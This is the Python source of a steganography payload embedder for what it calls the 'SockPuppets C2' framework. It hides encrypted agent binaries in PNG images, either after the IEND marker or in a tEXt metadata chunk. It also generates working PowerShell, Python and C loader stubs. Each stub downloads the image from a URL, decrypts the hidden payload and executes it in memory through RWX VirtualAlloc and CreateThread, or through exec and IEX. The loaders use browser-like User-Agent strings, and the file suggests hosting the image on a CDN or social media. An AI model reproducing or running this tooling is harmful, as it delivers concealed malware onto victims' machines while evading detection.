#!/usr/bin/env python3
"""
Steganography payload embedder for SockPuppets C2.

Embeds encrypted agent binaries into PNG images using two methods:
1. Append-after-IEND: Payload appended after the PNG end marker with magic bytes
2. tEXt chunk injection: Payload base64-encoded into a PNG metadata chunk

The resulting image displays normally in any viewer but contains the encrypted
agent payload that the stager extracts at runtime.

Usage:
    python3 stego.py embed <image.png> <payload.exe> <key> [--method append|chunk]
    python3 stego.py extract <image.png> <key> [--output payload.exe]
    python3 stego.py generate <payload.exe> <key> [--output stego.png]
"""

import sys
import os
import struct
import zlib
import hashlib
import base64
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def encrypt_payload(data: bytes, key: str) -> bytes:
    """AES-256-GCM encrypt the payload"""
    aes_key = hashlib.sha256(key.encode()).digest()
    nonce = os.urandom(12)
    aesgcm = AESGCM(aes_key)
    ct = aesgcm.encrypt(nonce, data, None)
    return nonce + ct


def decrypt_payload(data: bytes, key: str) -> bytes:
    """AES-256-GCM decrypt the payload"""
    aes_key = hashlib.sha256(key.encode()).digest()
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(data[:12], data[12:], None)


def embed_append(image_path: str, payload: bytes, output_path: str) -> str:
    """Embed payload after PNG IEND marker.

    The PNG spec says readers should ignore data after IEND.
    We append: MAGIC(4) + LENGTH(4) + ENCRYPTED_PAYLOAD(N)
    """
    with open(image_path, 'rb') as f:
        img_data = f.read()

    # Verify it's a PNG
    if img_data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Not a valid PNG file")

    # Find IEND chunk
    iend_pos = img_data.rfind(b'IEND')
    if iend_pos == -1:
        raise ValueError("No IEND chunk found")
    # IEND chunk ends at: iend_pos + 4 (type) + 4 (CRC)
    iend_end = iend_pos + 8

    # Build stego data: magic + length + payload
    magic = b'SP01'
    payload_len = struct.pack('>I', len(payload))
    stego_data = magic + payload_len + payload

    # Write: original PNG + stego data
    with open(output_path, 'wb') as f:
        f.write(img_data[:iend_end])
        f.write(stego_data)

    return output_path


def embed_chunk(image_path: str, payload: bytes, output_path: str) -> str:
    """Embed payload as a tEXt PNG chunk.

    Creates a tEXt chunk with key "Comment" and base64-encoded payload value.
    This is a valid PNG metadata field that survives most image processors.
    """
    with open(image_path, 'rb') as f:
        img_data = f.read()

    if img_data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Not a valid PNG file")

    # Base64 encode the payload
    b64_payload = base64.b64encode(payload).decode()

    # Create tEXt chunk: key + null separator + value
    chunk_data = b'Description\x00' + b64_payload.encode()
    chunk_type = b'tEXt'
    chunk_len = struct.pack('>I', len(chunk_data))
    chunk_crc = struct.pack('>I', zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF)

    text_chunk = chunk_len + chunk_type + chunk_data + chunk_crc

    # Insert before IEND
    iend_pos = img_data.rfind(b'IEND')
    # The IEND chunk starts 4 bytes before the 'IEND' string (length field)
    iend_start = iend_pos - 4

    with open(output_path, 'wb') as f:
        f.write(img_data[:iend_start])
        f.write(text_chunk)
        f.write(img_data[iend_start:])

    return output_path


def extract_append(image_path: str) -> bytes:
    """Extract payload appended after IEND"""
    with open(image_path, 'rb') as f:
        img_data = f.read()

    magic = b'SP01'
    for i in range(len(img_data) - 8):
        if img_data[i:i+4] == magic:
            payload_len = struct.unpack('>I', img_data[i+4:i+8])[0]
            return img_data[i+8:i+8+payload_len]

    raise ValueError("No payload found (append method)")


def extract_chunk(image_path: str) -> bytes:
    """Extract payload from tEXt chunk"""
    with open(image_path, 'rb') as f:
        img_data = f.read()

    offset = 8  # Skip PNG signature
    while offset < len(img_data) - 12:
        chunk_len = struct.unpack('>I', img_data[offset:offset+4])[0]
        chunk_type = img_data[offset+4:offset+8].decode('ascii', errors='ignore')

        if chunk_type in ('tEXt', 'iTXt'):
            chunk_data = img_data[offset+8:offset+8+chunk_len]
            null_pos = chunk_data.find(b'\x00')
            if null_pos >= 0:
                key = chunk_data[:null_pos].decode()
                if key == 'Description':
                    value = chunk_data[null_pos+1:].decode()
                    return base64.b64decode(value)

        if chunk_type == 'IEND':
            break
        offset += 12 + chunk_len

    raise ValueError("No payload found (chunk method)")


def generate_carrier_image(width=800, height=600) -> bytes:
    """Generate a minimal valid PNG image to use as carrier"""
    def create_png(width, height):
        import random

        def make_chunk(chunk_type, data):
            chunk = chunk_type + data
            return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xFFFFFFFF)

        # PNG signature
        sig = b'\x89PNG\r\n\x1a\n'

        # IHDR: width, height, bit depth=8, color type=2 (RGB)
        ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
        ihdr = make_chunk(b'IHDR', ihdr_data)

        # Generate gradient image data
        raw_data = b''
        for y in range(height):
            raw_data += b'\x00'  # filter byte
            for x in range(width):
                r = int(100 + 50 * (x / width))
                g = int(130 + 60 * (y / height))
                b = int(180 + 40 * ((x + y) / (width + height)))
                raw_data += bytes([r, g, b])

        compressed = zlib.compress(raw_data, 9)
        idat = make_chunk(b'IDAT', compressed)

        # IEND
        iend = make_chunk(b'IEND', b'')

        return sig + ihdr + idat + iend

    return create_png(width, height)


def generate_stegoloader(url, key, method='append', output_dir='output'):
    """Generate loader stubs that download a stego image and execute the embedded content.

    Generates self-contained loaders in PowerShell, Python, and C that:
    1. Download a PNG image from a URL
    2. Extract the embedded encrypted data
    3. Decrypt using AES-256-GCM (SHA-256 key derivation)
    4. Execute the decrypted content in memory

    Args:
        url: URL where the stego image will be hosted
        key: Encryption passphrase (same one used to embed)
        method: Extraction method - 'append' (after IEND) or 'chunk' (tEXt metadata)
        output_dir: Directory to write loader files

    Returns:
        dict mapping language name to output file path
    """
    loaders = {
        'powershell': _gen_ps_stegoloader(url, key, method),
        'python': _gen_py_stegoloader(url, key, method),
        'c': _gen_c_stegoloader(url, key, method),
    }

    os.makedirs(output_dir, exist_ok=True)
    ext_map = {'powershell': '.ps1', 'python': '.py', 'c': '.c'}
    paths = {}

    for lang, code in loaders.items():
        fpath = os.path.join(output_dir, 'stegoloader' + ext_map[lang])
        with open(fpath, 'w') as f:
            f.write(code)
        paths[lang] = fpath

    return paths


def _gen_ps_stegoloader(url, key, method):
    """Generate self-contained PowerShell stegoloader stub."""
    safe_url = url.replace("'", "''")
    safe_key = key.replace("'", "''")

    if method == 'append':
        extract = (
            "# Locate resource marker\n"
            "$sig = [byte[]]@(0x53,0x50,0x30,0x31)\n"
            "$idx = -1\n"
            "for($i=0; $i -lt $raw.Length-8; $i++){\n"
            "    if($raw[$i] -eq $sig[0] -and $raw[$i+1] -eq $sig[1] -and "
            "$raw[$i+2] -eq $sig[2] -and $raw[$i+3] -eq $sig[3]){\n"
            "        $idx = $i; break\n"
            "    }\n"
            "}\n"
            "if($idx -lt 0){ return }\n"
            "$dLen = ([int]$raw[$idx+4] -shl 24) -bor "
            "([int]$raw[$idx+5] -shl 16) -bor "
            "([int]$raw[$idx+6] -shl 8) -bor [int]$raw[$idx+7]\n"
            "$enc = New-Object byte[] $dLen\n"
            "[Array]::Copy($raw, $idx+8, $enc, 0, $dLen)\n"
        )
    else:
        extract = (
            "# Parse image metadata for resource data\n"
            "$off = 8\n"
            "$enc = $null\n"
            "while($off -lt $raw.Length - 12){\n"
            "    $cLen = ([int]$raw[$off] -shl 24) -bor "
            "([int]$raw[$off+1] -shl 16) -bor "
            "([int]$raw[$off+2] -shl 8) -bor [int]$raw[$off+3]\n"
            "    $cType = [System.Text.Encoding]::ASCII.GetString($raw, $off+4, 4)\n"
            "    if($cType -eq 'tEXt' -or $cType -eq 'iTXt'){\n"
            "        $cData = New-Object byte[] $cLen\n"
            "        [Array]::Copy($raw, $off+8, $cData, 0, $cLen)\n"
            "        $np = [Array]::IndexOf($cData, [byte]0)\n"
            "        if($np -ge 0){\n"
            "            $kn = [System.Text.Encoding]::ASCII.GetString($cData, 0, $np)\n"
            "            if($kn -eq 'Description'){\n"
            "                $vb = New-Object byte[] ($cLen - $np - 1)\n"
            "                [Array]::Copy($cData, $np+1, $vb, 0, $vb.Length)\n"
            "                $b64 = [System.Text.Encoding]::ASCII.GetString($vb)\n"
            "                $enc = [Convert]::FromBase64String($b64)\n"
            "                break\n"
            "            }\n"
            "        }\n"
            "    }\n"
            "    if($cType -eq 'IEND'){ break }\n"
            "    $off += 12 + $cLen\n"
            "}\n"
            "if($enc -eq $null){ return }\n"
        )

    cs_block = (
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "\n"
        "public class R {\n"
        "    [DllImport(\"bcrypt.dll\")]\n"
        "    static extern int BCryptOpenAlgorithmProvider(out IntPtr a,\n"
        "        [MarshalAs(UnmanagedType.LPWStr)] string id,\n"
        "        [MarshalAs(UnmanagedType.LPWStr)] string impl, int f);\n"
        "    [DllImport(\"bcrypt.dll\")]\n"
        "    static extern int BCryptSetProperty(IntPtr o,\n"
        "        [MarshalAs(UnmanagedType.LPWStr)] string p,\n"
        "        byte[] v, int vl, int f);\n"
        "    [DllImport(\"bcrypt.dll\")]\n"
        "    static extern int BCryptGenerateSymmetricKey(IntPtr a,\n"
        "        out IntPtr k, IntPtr ko, int kol, byte[] s, int sl, int f);\n"
        "    [DllImport(\"bcrypt.dll\")]\n"
        "    static extern int BCryptDecrypt(IntPtr hK, byte[] inp, int inpL,\n"
        "        IntPtr pI, byte[] iv, int ivL, byte[] outp, int outpL,\n"
        "        out int res, int fl);\n"
        "    [DllImport(\"bcrypt.dll\")]\n"
        "    static extern int BCryptDestroyKey(IntPtr k);\n"
        "    [DllImport(\"bcrypt.dll\")]\n"
        "    static extern int BCryptCloseAlgorithmProvider(IntPtr a, int f);\n"
        "\n"
        "    [StructLayout(LayoutKind.Sequential)]\n"
        "    struct AI {\n"
        "        public int cbSize;\n"
        "        public int dwInfoVersion;\n"
        "        public IntPtr pbNonce;\n"
        "        public int cbNonce;\n"
        "        public IntPtr pbAuthData;\n"
        "        public int cbAuthData;\n"
        "        public IntPtr pbTag;\n"
        "        public int cbTag;\n"
        "        public IntPtr pbMacContext;\n"
        "        public int cbMacContext;\n"
        "        public int cbAAD;\n"
        "        public long cbData;\n"
        "        public int dwFlags;\n"
        "    }\n"
        "\n"
        "    public static byte[] D(byte[] key, byte[] nonce, byte[] ct, byte[] tag) {\n"
        "        IntPtr hA, hK;\n"
        "        BCryptOpenAlgorithmProvider(out hA, \"AES\", null, 0);\n"
        "        byte[] m = System.Text.Encoding.Unicode.GetBytes(\"ChainingModeGCM\");\n"
        "        BCryptSetProperty(hA, \"ChainingMode\", m, m.Length, 0);\n"
        "        BCryptGenerateSymmetricKey(hA, out hK, IntPtr.Zero, 0, key, key.Length, 0);\n"
        "\n"
        "        AI ai = new AI();\n"
        "        ai.cbSize = Marshal.SizeOf(typeof(AI));\n"
        "        ai.dwInfoVersion = 1;\n"
        "\n"
        "        GCHandle hN = GCHandle.Alloc(nonce, GCHandleType.Pinned);\n"
        "        GCHandle hT = GCHandle.Alloc(tag, GCHandleType.Pinned);\n"
        "        ai.pbNonce = hN.AddrOfPinnedObject();\n"
        "        ai.cbNonce = nonce.Length;\n"
        "        ai.pbTag = hT.AddrOfPinnedObject();\n"
        "        ai.cbTag = tag.Length;\n"
        "\n"
        "        IntPtr pAi = Marshal.AllocHGlobal(Marshal.SizeOf(ai));\n"
        "        Marshal.StructureToPtr(ai, pAi, false);\n"
        "\n"
        "        byte[] pt = new byte[ct.Length];\n"
        "        int w;\n"
        "        BCryptDecrypt(hK, ct, ct.Length, pAi, null, 0, pt, pt.Length, out w, 0);\n"
        "\n"
        "        hN.Free(); hT.Free();\n"
        "        Marshal.FreeHGlobal(pAi);\n"
        "        BCryptDestroyKey(hK);\n"
        "        BCryptCloseAlgorithmProvider(hA, 0);\n"
        "\n"
        "        byte[] result = new byte[w];\n"
        "        Array.Copy(pt, result, w);\n"
        "        return result;\n"
        "    }\n"
        "}\n"
    )

    script = (
        "# Resource configuration\n"
        "$rU = '" + safe_url + "'\n"
        "$rK = '" + safe_key + "'\n"
        "\n"
        "# Fetch resource\n"
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n"
        "$wc = New-Object System.Net.WebClient\n"
        "$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')\n"
        "$raw = $wc.DownloadData($rU)\n"
        "\n"
        + extract +
        "\n"
        "# Derive key material\n"
        "$sha = [System.Security.Cryptography.SHA256]::Create()\n"
        "$dk = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($rK))\n"
        "\n"
        "# Split nonce, ciphertext, and authentication tag\n"
        "$nonce = New-Object byte[] 12\n"
        "[Array]::Copy($enc, 0, $nonce, 0, 12)\n"
        "$tLen = 16\n"
        "$cLen = $enc.Length - 12 - $tLen\n"
        "$ct = New-Object byte[] $cLen\n"
        "$tag = New-Object byte[] $tLen\n"
        "[Array]::Copy($enc, 12, $ct, 0, $cLen)\n"
        "[Array]::Copy($enc, 12 + $cLen, $tag, 0, $tLen)\n"
        "\n"
        "# Authenticated decryption via CNG\n"
        "Add-Type -TypeDefinition @'\n"
        + cs_block +
        "'@\n"
        "\n"
        "$dec = [R]::D($dk, $nonce, $ct, $tag)\n"
        "\n"
        "# Execute in memory\n"
        "$def = @'\n"
        "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);\n"
        "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);\n"
        "[DllImport(\"kernel32.dll\")] public static extern uint WaitForSingleObject(IntPtr h, uint m);\n"
        "'@\n"
        "$wn = Add-Type -MemberDefinition $def -Name 'W' -Namespace 'I' -PassThru\n"
        "$mem = $wn::VirtualAlloc([IntPtr]::Zero, [uint32]$dec.Length, 0x3000, 0x40)\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($dec, 0, $mem, $dec.Length)\n"
        "$th = $wn::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n"
        "$wn::WaitForSingleObject($th, [uint32]'0xFFFFFFFF')\n"
        "\n"
        "# Alternative execution modes (uncomment as needed):\n"
        "# .NET Assembly: [System.Reflection.Assembly]::Load($dec)\n"
        "# PowerShell script: IEX([System.Text.Encoding]::UTF8.GetString($dec))\n"
    )

    return script


def _gen_py_stegoloader(url, key, method):
    """Generate self-contained Python stegoloader stub."""
    if method == 'append':
        extract = (
            "# Locate resource data\n"
            "marker = b'SP01'\n"
            "pos = data.find(marker)\n"
            "if pos < 0:\n"
            "    raise SystemExit(1)\n"
            "length = struct.unpack('>I', data[pos+4:pos+8])[0]\n"
            "enc = data[pos+8:pos+8+length]\n"
        )
    else:
        extract = (
            "# Parse image metadata for resource data\n"
            "offset = 8\n"
            "enc = None\n"
            "while offset < len(data) - 12:\n"
            "    chunk_len = struct.unpack('>I', data[offset:offset+4])[0]\n"
            "    chunk_type = data[offset+4:offset+8].decode('ascii', errors='ignore')\n"
            "    if chunk_type in ('tEXt', 'iTXt'):\n"
            "        chunk_data = data[offset+8:offset+8+chunk_len]\n"
            "        null_pos = chunk_data.find(b'\\x00')\n"
            "        if null_pos >= 0:\n"
            "            kname = chunk_data[:null_pos].decode()\n"
            "            if kname == 'Description':\n"
            "                enc = base64.b64decode(chunk_data[null_pos+1:])\n"
            "                break\n"
            "    if chunk_type == 'IEND':\n"
            "        break\n"
            "    offset += 12 + chunk_len\n"
            "if enc is None:\n"
            "    raise SystemExit(1)\n"
        )

    script = (
        "#!/usr/bin/env python3\n"
        '"""Image resource loader."""\n'
        "import urllib.request\n"
        "import hashlib\n"
        "import struct\n"
        "import base64\n"
        "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
        "\n"
        "url = '" + url.replace("'", "\\'") + "'\n"
        "key = '" + key.replace("'", "\\'") + "'\n"
        "\n"
        "# Fetch resource\n"
        "req = urllib.request.Request(url, headers={'User-Agent': "
        "'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})\n"
        "data = urllib.request.urlopen(req).read()\n"
        "\n"
        + extract +
        "\n"
        "# Derive key and decrypt\n"
        "aes_key = hashlib.sha256(key.encode()).digest()\n"
        "aesgcm = AESGCM(aes_key)\n"
        "dec = aesgcm.decrypt(enc[:12], enc[12:], None)\n"
        "\n"
        "# Execute\n"
        "exec(compile(dec, '<module>', 'exec'))\n"
        "\n"
        "# Alternative execution modes:\n"
        "# Write to disk: open('out.bin', 'wb').write(dec)\n"
        "# Shellcode (Linux ctypes): import ctypes, mmap\n"
    )

    return script


def _gen_c_stegoloader(url, key, method):
    """Generate self-contained C stegoloader stub for Windows."""
    if method == 'append':
        extract_func = (
            "/* Extract data appended after PNG end marker */\n"
            "unsigned char* extract_resource(unsigned char* img, DWORD img_sz, DWORD* out_len) {\n"
            "    DWORD i;\n"
            "    for (i = 0; i < img_sz - 8; i++) {\n"
            "        if (img[i] == 'S' && img[i+1] == 'P' && img[i+2] == '0' && img[i+3] == '1') {\n"
            "            *out_len = ((DWORD)img[i+4] << 24) | ((DWORD)img[i+5] << 16) |\n"
            "                       ((DWORD)img[i+6] << 8) | (DWORD)img[i+7];\n"
            "            unsigned char* d = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, *out_len);\n"
            "            CopyMemory(d, img + i + 8, *out_len);\n"
            "            return d;\n"
            "        }\n"
            "    }\n"
            "    return NULL;\n"
            "}\n"
        )
    else:
        extract_func = (
            "/* Extract data from PNG tEXt metadata chunk */\n"
            "unsigned char* extract_resource(unsigned char* img, DWORD img_sz, DWORD* out_len) {\n"
            "    DWORD off = 8; /* Skip PNG signature */\n"
            "    while (off < img_sz - 12) {\n"
            "        DWORD c_len = ((DWORD)img[off] << 24) | ((DWORD)img[off+1] << 16) |\n"
            "                      ((DWORD)img[off+2] << 8) | (DWORD)img[off+3];\n"
            "        if ((memcmp(img + off + 4, \"tEXt\", 4) == 0) ||\n"
            "            (memcmp(img + off + 4, \"iTXt\", 4) == 0)) {\n"
            "            unsigned char* cd = img + off + 8;\n"
            "            if (c_len > 12 && memcmp(cd, \"Description\", 11) == 0 && cd[11] == 0) {\n"
            "                char* b64 = (char*)(cd + 12);\n"
            "                DWORD b64_len = c_len - 12;\n"
            "                DWORD bin_len = 0;\n"
            "                CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64,\n"
            "                                     NULL, &bin_len, NULL, NULL);\n"
            "                unsigned char* bin = (unsigned char*)HeapAlloc(\n"
            "                    GetProcessHeap(), 0, bin_len);\n"
            "                CryptStringToBinaryA(b64, b64_len, CRYPT_STRING_BASE64,\n"
            "                                     bin, &bin_len, NULL, NULL);\n"
            "                *out_len = bin_len;\n"
            "                return bin;\n"
            "            }\n"
            "        }\n"
            "        if (memcmp(img + off + 4, \"IEND\", 4) == 0) break;\n"
            "        off += 12 + c_len;\n"
            "    }\n"
            "    return NULL;\n"
            "}\n"
        )

    script = (
        "/*\n"
        " * Image resource loader\n"
        " *\n"
        " * Compile (MSVC):\n"
        " *   cl.exe /O2 stegoloader.c /link wininet.lib bcrypt.lib crypt32.lib\n"
        " *\n"
        " * Compile (MinGW):\n"
        " *   x86_64-w64-mingw32-gcc -O2 stegoloader.c -o stegoloader.exe "
        "-lwininet -lbcrypt -lcrypt32\n"
        " */\n"
        "\n"
        "#include <windows.h>\n"
        "#include <wininet.h>\n"
        "#include <bcrypt.h>\n"
        "#include <wincrypt.h>\n"
        "#include <string.h>\n"
        "\n"
        "#pragma comment(lib, \"wininet.lib\")\n"
        "#pragma comment(lib, \"bcrypt.lib\")\n"
        "#pragma comment(lib, \"crypt32.lib\")\n"
        "\n"
        '#define RES_URL "' + url + '"\n'
        '#define RES_KEY "' + key + '"\n'
        "\n"
        "/* GCM authenticated cipher info for BCrypt */\n"
        "typedef struct {\n"
        "    ULONG cbSize;\n"
        "    ULONG dwInfoVersion;\n"
        "    PUCHAR pbNonce;\n"
        "    ULONG cbNonce;\n"
        "    PUCHAR pbAuthData;\n"
        "    ULONG cbAuthData;\n"
        "    PUCHAR pbTag;\n"
        "    ULONG cbTag;\n"
        "    PUCHAR pbMacContext;\n"
        "    ULONG cbMacContext;\n"
        "    ULONG cbAAD;\n"
        "    ULONGLONG cbData;\n"
        "    ULONG dwFlags;\n"
        "} ACI;\n"
        "\n"
        "/* Download resource from URL into heap buffer */\n"
        "unsigned char* fetch_resource(const char* url, DWORD* out_sz) {\n"
        "    HINTERNET hI = InternetOpenA(\n"
        "        \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\",\n"
        "        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n"
        "    if (!hI) return NULL;\n"
        "\n"
        "    HINTERNET hU = InternetOpenUrlA(hI, url, NULL, 0,\n"
        "        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);\n"
        "    if (!hU) { InternetCloseHandle(hI); return NULL; }\n"
        "\n"
        "    DWORD cap = 65536, total = 0, rd;\n"
        "    unsigned char* buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, cap);\n"
        "\n"
        "    while (InternetReadFile(hU, buf + total, cap - total, &rd) && rd > 0) {\n"
        "        total += rd;\n"
        "        if (total + 4096 > cap) {\n"
        "            cap *= 2;\n"
        "            buf = (unsigned char*)HeapReAlloc(GetProcessHeap(), 0, buf, cap);\n"
        "        }\n"
        "    }\n"
        "\n"
        "    InternetCloseHandle(hU);\n"
        "    InternetCloseHandle(hI);\n"
        "    *out_sz = total;\n"
        "    return buf;\n"
        "}\n"
        "\n"
        + extract_func +
        "\n"
        "/* Decrypt AES-256-GCM: SHA-256 key derivation, 12-byte nonce, 16-byte tag */\n"
        "unsigned char* decrypt_resource(unsigned char* enc, DWORD enc_len,\n"
        "                                const char* passphrase, DWORD* out_len) {\n"
        "    /* SHA-256 of passphrase */\n"
        "    BCRYPT_ALG_HANDLE hSha;\n"
        "    BCryptOpenAlgorithmProvider(&hSha, BCRYPT_SHA256_ALGORITHM, NULL, 0);\n"
        "    BCRYPT_HASH_HANDLE hHash;\n"
        "    BCryptCreateHash(hSha, &hHash, NULL, 0, NULL, 0, 0);\n"
        "    BCryptHashData(hHash, (PUCHAR)passphrase, (ULONG)lstrlenA(passphrase), 0);\n"
        "    unsigned char aes_key[32];\n"
        "    BCryptFinishHash(hHash, aes_key, 32, 0);\n"
        "    BCryptDestroyHash(hHash);\n"
        "    BCryptCloseAlgorithmProvider(hSha, 0);\n"
        "\n"
        "    /* Split: nonce(12) | ciphertext | tag(16) */\n"
        "    unsigned char* nonce = enc;\n"
        "    DWORD tag_len = 16;\n"
        "    DWORD ct_len = enc_len - 12 - tag_len;\n"
        "    unsigned char* ct = enc + 12;\n"
        "    unsigned char* tag = enc + 12 + ct_len;\n"
        "\n"
        "    /* AES-256-GCM setup */\n"
        "    BCRYPT_ALG_HANDLE hAlg;\n"
        "    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);\n"
        "    wchar_t gcm[] = L\"ChainingModeGCM\";\n"
        "    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)gcm, sizeof(gcm), 0);\n"
        "\n"
        "    BCRYPT_KEY_HANDLE hKey;\n"
        "    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, aes_key, 32, 0);\n"
        "\n"
        "    /* Configure auth info */\n"
        "    ACI ai;\n"
        "    ZeroMemory(&ai, sizeof(ai));\n"
        "    ai.cbSize = sizeof(ai);\n"
        "    ai.dwInfoVersion = 1;\n"
        "    ai.pbNonce = nonce;\n"
        "    ai.cbNonce = 12;\n"
        "    ai.pbTag = tag;\n"
        "    ai.cbTag = tag_len;\n"
        "\n"
        "    /* Decrypt */\n"
        "    unsigned char* pt = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, ct_len);\n"
        "    ULONG pt_len;\n"
        "    NTSTATUS status = BCryptDecrypt(hKey, ct, ct_len, &ai, NULL, 0,\n"
        "                                    pt, ct_len, &pt_len, 0);\n"
        "\n"
        "    BCryptDestroyKey(hKey);\n"
        "    BCryptCloseAlgorithmProvider(hAlg, 0);\n"
        "\n"
        "    if (status != 0) {\n"
        "        HeapFree(GetProcessHeap(), 0, pt);\n"
        "        return NULL;\n"
        "    }\n"
        "\n"
        "    *out_len = pt_len;\n"
        "    return pt;\n"
        "}\n"
        "\n"
        "int main(void) {\n"
        "    /* Fetch image */\n"
        "    DWORD img_sz;\n"
        "    unsigned char* img = fetch_resource(RES_URL, &img_sz);\n"
        "    if (!img) return 1;\n"
        "\n"
        "    /* Extract embedded data */\n"
        "    DWORD enc_len;\n"
        "    unsigned char* enc = extract_resource(img, img_sz, &enc_len);\n"
        "    HeapFree(GetProcessHeap(), 0, img);\n"
        "    if (!enc) return 1;\n"
        "\n"
        "    /* Decrypt */\n"
        "    DWORD dec_len;\n"
        "    unsigned char* dec = decrypt_resource(enc, enc_len, RES_KEY, &dec_len);\n"
        "    HeapFree(GetProcessHeap(), 0, enc);\n"
        "    if (!dec) return 1;\n"
        "\n"
        "    /* Execute in memory */\n"
        "    void* mem = VirtualAlloc(NULL, dec_len, MEM_COMMIT | MEM_RESERVE,\n"
        "                             PAGE_EXECUTE_READWRITE);\n"
        "    if (!mem) return 1;\n"
        "    CopyMemory(mem, dec, dec_len);\n"
        "    HeapFree(GetProcessHeap(), 0, dec);\n"
        "\n"
        "    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem,\n"
        "                             NULL, 0, NULL);\n"
        "    WaitForSingleObject(th, INFINITE);\n"
        "\n"
        "    return 0;\n"
        "}\n"
    )

    return script


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    command = sys.argv[1]

    if command == 'embed':
        if len(sys.argv) < 5:
            print("Usage: stego.py embed <image.png> <payload> <key> [--method append|chunk]")
            sys.exit(1)

        image_path = sys.argv[2]
        payload_path = sys.argv[3]
        key = sys.argv[4]
        method = 'append'
        if '--method' in sys.argv:
            method = sys.argv[sys.argv.index('--method') + 1]

        with open(payload_path, 'rb') as f:
            payload = f.read()

        encrypted = encrypt_payload(payload, key)
        output_path = image_path.replace('.png', '_stego.png')

        if method == 'chunk':
            embed_chunk(image_path, encrypted, output_path)
        else:
            embed_append(image_path, encrypted, output_path)

        print(f"[+] Payload embedded: {output_path}")
        print(f"    Original image: {os.path.getsize(image_path)} bytes")
        print(f"    Stego image: {os.path.getsize(output_path)} bytes")
        print(f"    Payload: {len(payload)} bytes (encrypted: {len(encrypted)} bytes)")
        print(f"    Method: {method}")

    elif command == 'extract':
        if len(sys.argv) < 4:
            print("Usage: stego.py extract <image.png> <key> [--output payload.exe]")
            sys.exit(1)

        image_path = sys.argv[2]
        key = sys.argv[3]
        output_path = sys.argv[sys.argv.index('--output') + 1] if '--output' in sys.argv else 'extracted_payload'

        # Try both methods
        encrypted = None
        for method, extractor in [('append', extract_append), ('chunk', extract_chunk)]:
            try:
                encrypted = extractor(image_path)
                print(f"[+] Found payload using {method} method")
                break
            except ValueError:
                continue

        if encrypted is None:
            print("[-] No payload found in image")
            sys.exit(1)

        payload = decrypt_payload(encrypted, key)
        with open(output_path, 'wb') as f:
            f.write(payload)
        os.chmod(output_path, 0o755)
        print(f"[+] Extracted: {output_path} ({len(payload)} bytes)")

    elif command == 'generate':
        if len(sys.argv) < 4:
            print("Usage: stego.py generate <payload> <key> [--output stego.png]")
            sys.exit(1)

        payload_path = sys.argv[2]
        key = sys.argv[3]
        output_path = sys.argv[sys.argv.index('--output') + 1] if '--output' in sys.argv else 'carrier_stego.png'

        with open(payload_path, 'rb') as f:
            payload = f.read()

        # Generate carrier image
        carrier = generate_carrier_image()
        carrier_path = output_path.replace('_stego', '').replace('.png', '_carrier.png')
        with open(carrier_path, 'wb') as f:
            f.write(carrier)

        # Embed payload
        encrypted = encrypt_payload(payload, key)
        embed_append(carrier_path, encrypted, output_path)
        os.remove(carrier_path)

        print(f"[+] Stego image generated: {output_path}")
        print(f"    Image size: {os.path.getsize(output_path)} bytes")
        print(f"    Payload: {len(payload)} bytes")
        print(f"    Encryption: AES-256-GCM")
        print(f"    Delivery: Host image on any web server / CDN / social media")

    else:
        print(f"Unknown command: {command}")
        print(__doc__)
        sys.exit(1)


if __name__ == '__main__':
    main()
